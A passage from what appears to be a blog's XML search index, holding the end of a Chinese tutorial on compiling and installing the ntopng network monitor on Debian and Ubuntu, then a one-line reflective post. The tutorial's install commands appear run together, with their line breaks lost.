基于 libpcap 并且它以可移植的方式被重写，以达到可以在每一个 Unix 平台 、 MacOSX 以及 Win32 上运行的目的。<br>为了在 Debian，Ubuntu 系统上安装 ntopng，首先我们需要安装 编译 ntopng 所需的依赖软件包。<br>你可以通过在一个 shell 窗口或一个虚拟终端中运行下面的命令来安装它们：</p><pre><code>sudo apt-get install libpcap-dev libglib2.0-dev libgeoip-dev redis-server wget libxml2-dev build-essential checkinstall</code></pre><p>现在，我们需要像下面一样针对我们的系统手动编译 ntopng ：</p><pre><code>sudo wget http://sourceforge.net/projects/ntop/files/ntopng/ntopng-1.1_6932.tgz/downloadsudo tar zxfv ntopng-1.1_6932.tgzsudo cd ntopng-1.1_6932sudo ./configuresudo makesudo make install</code></pre><p>这样，在你的 Debian 或 Ubuntu 系统上应该已经安装上了你编译的 ntopng 。<br>我们已经有了有关 ntopng 的使用方法的教程，它既可以在命令行也可以在 Web 界面中使用，<br>我们可以前往这些教程来获得有关 ntopng 的知识。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随想</title>
      <link href="/2023/11/10/first/"/>
      <url>/2023/11/10/first/</url>
      
        <content type="html"><![CDATA[<p>灵魂困于方寸之地, 枷锁桎梏自由之身。</p>]]></content>
      
      
      <categories>
          
          <category> thinking </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinking </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
